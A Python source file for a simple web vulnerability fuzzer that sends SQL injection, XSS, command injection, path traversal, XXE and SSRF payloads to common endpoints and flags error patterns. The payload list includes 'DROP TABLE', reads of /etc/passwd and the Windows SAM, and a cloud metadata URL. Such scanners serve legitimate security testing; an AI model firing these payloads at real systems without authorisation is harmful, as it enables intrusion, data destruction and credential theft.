"""
Basic fuzzing engine for parameter discovery and vulnerability testing.
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import string
import random

def test_fuzzing(base_url):
    """
    Test for vulnerabilities using basic fuzzing techniques.

    Args:
        base_url (str): Base URL to test

    Returns:
        list: List of detected vulnerabilities
    """
    vulnerabilities = []

    # Common fuzzing payloads
    fuzz_payloads = [
        # SQL injection payloads
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM information_schema.tables; --",

        # XSS payloads
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",

        # Command injection
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",

        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",

        # Format string
        "%s%s%s%s",
        "%n%n%n%n",

        # Buffer overflow
        "A" * 1000,
        "A" * 10000,

        # LDAP injection
        "*)(&(userPassword=*)",

        # NoSQL injection
        "{'$ne': null}",
        "{'$gt': ''}",

        # XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",

        # SSRF
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://127.0.0.1:80"
    ]

    # Common parameter names to fuzz
    common_params = [
        'id', 'user', 'username', 'password', 'email', 'search', 'query',
        'input', 'data', 'file', 'path', 'url', 'redirect', 'return',
        'next', 'page', 'limit', 'offset', 'sort', 'order', 'filter',
        'category', 'type', 'action', 'cmd', 'command', 'exec', 'run'
    ]

    # Test endpoints
    test_endpoints = [
        base_url,
        urljoin(base_url, "/search"),
        urljoin(base_url, "/api/search"),
        urljoin(base_url, "/user"),
        urljoin(base_url, "/admin"),
        urljoin(base_url, "/api/user"),
        urljoin(base_url, "/api/data")
    ]

    # Error patterns that indicate potential vulnerabilities
    error_patterns = {
        'sql': ['sql syntax', 'mysql error', 'postgresql error', 'sqlite error', 'oracle error', 'syntax error'],
        'xss': ['alert(', '<script', 'onerror', 'javascript:'],
        'command': ['command not found', 'permission denied', 'no such file', 'ls -la', 'whoami'],
        'path': ['root:', 'daemon:', 'no such file or directory'],
        'ldap': ['ldap error', 'invalid dn'],
        'nosql': ['mongoerror', 'bson', 'json parse error']
    }

    for endpoint in test_endpoints:
        for param in common_params:
            for payload in fuzz_payloads[:10]:  # Limit to first 10 payloads to avoid too many requests
                try:
                    # Test GET parameters
                    params = {param: payload}
                    response = requests.get(endpoint, params=params, timeout=5)

                    content_lower = response.text.lower()

                    # Check for error patterns
                    for vuln_type, patterns in error_patterns.items():
                        if any(pattern in content_lower for pattern in patterns):
                            vulnerabilities.append({
                                "type": f"Fuzzing Detected {vuln_type.upper()} Vulnerability",
                                "endpoint": endpoint,
                                "payload": f"{param}={payload}",
                                "method": "GET",
                                "evidence": f"Error pattern matched: {vuln_type} injection possible"
                            })
                            break

                    # Check for unusual status codes
                    if response.status_code in [500, 400, 403]:
                        vulnerabilities.append({
                            "type": "Fuzzing Detected Abnormal Response",
                            "endpoint": endpoint,
                            "payload": f"{param}={payload}",
                            "method": "GET",
                            "evidence": f"Status code {response.status_code} with fuzz payload"
                        })

                    # Test POST parameters
                    data = {param: payload}
                    response_post = requests.post(endpoint, data=data, timeout=5)

                    content_lower_post = response_post.text.lower()

                    for vuln_type, patterns in error_patterns.items():
                        if any(pattern in content_lower_post for pattern in patterns):
                            vulnerabilities.append({
                                "type": f"Fuzzing Detected {vuln_type.upper()} Vulnerability",
                                "endpoint": endpoint,
                                "payload": f"POST {param}={payload}",
                                "method": "POST",
                                "evidence": f"Error pattern matched: {vuln_type} injection possible"
                            })
                            break

                    if response_post.status_code in [500, 400, 403]:
                        vulnerabilities.append({
                            "type": "Fuzzing Detected Abnormal Response",
                            "endpoint": endpoint,
                            "payload": f"POST {param}={payload}",
                            "method": "POST",
                            "evidence": f"Status code {response_post.status_code} with fuzz payload"
                        })

                except requests.RequestException:
                    continue

    # Parameter discovery fuzzing - try random parameter names
    random_params = [''.join(random.choices(string.ascii_lowercase, k=8)) for _ in range(5)]

    for endpoint in test_endpoints[:2]:  # Limit to first 2 endpoints
        for param in random_params:
            try:
                params = {param: 'test'}
                response = requests.get(endpoint, params=params, timeout=5)

                # If response differs from base request, parameter might be accepted
                base_response = requests.get(endpoint, timeout=5)

                if response.text != base_response.text or response.status_code != base_response.status_code:
                    vulnerabilities.append({
                        "type": "Parameter Discovery",
                        "endpoint": endpoint,
                        "payload": f"{param}=test",
                        "method": "GET",
                        "evidence": "Parameter accepted and affects response"
                    })

            except requests.RequestException:
                continue

    return vulnerabilities
